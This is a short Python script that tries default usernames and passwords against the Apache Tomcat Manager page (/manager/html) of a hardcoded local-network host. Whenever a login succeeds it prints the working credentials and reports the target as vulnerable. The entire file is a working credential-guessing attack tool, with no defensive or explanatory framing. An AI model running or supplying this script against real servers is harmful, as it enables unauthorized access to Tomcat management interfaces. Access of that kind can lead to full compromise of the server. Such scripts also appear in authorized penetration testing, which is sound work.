import requests
import base64

payload = '/manager/html'

username_list = ['admin', 'tomcat']
password_list = ['admin', '123456', 'tomcat']

def tomcat_auth(hosts):
    if "http" not in hosts:
        hosts = "http://" + hosts
    url = hosts + payload

    for u in username_list:
        for p in password_list:
            print(u, p)
            headers = {
                "Authorization": "Basic " + base64.b64encode(
                    bytes(u.encode()) + b":" + bytes(p.encode())).decode(),
            }
            conn = requests.get(url, headers=headers)
            if conn.status_code == 200:
                print("存在漏洞")
                print("用户名: %s 密码: %s" %(u, p))


if __name__ == '__main__':
    tomcat_auth("192.168.123.14:8080")
